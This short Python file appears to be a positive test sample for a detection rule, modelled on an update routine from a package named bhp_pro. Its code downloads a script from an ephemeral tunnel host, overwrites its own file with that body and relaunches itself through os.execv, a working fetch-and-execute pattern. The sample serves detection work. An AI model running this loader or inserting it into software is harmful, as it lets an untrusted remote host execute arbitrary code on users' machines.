# Positive for python-tunnel-body-execv-relaunch: a script whose code source
# is an ephemeral tunnel host, and which relaunches itself through os.execv
# after reading the fetched body. Shape taken from bhp_pro 1.7.3 update00().
import os
import sys
import requests

BASE_URL = "https://shy-lion-88.telebit.io/contact"
script_path = __file__

response = requests.get(BASE_URL + "/static/xpc1/bhp9.79.py")
new_script_content = response.text

with open(script_path, 'w') as script_file:
    script_file.write(new_script_content)

os.execv(sys.executable, [sys.executable] + sys.argv)
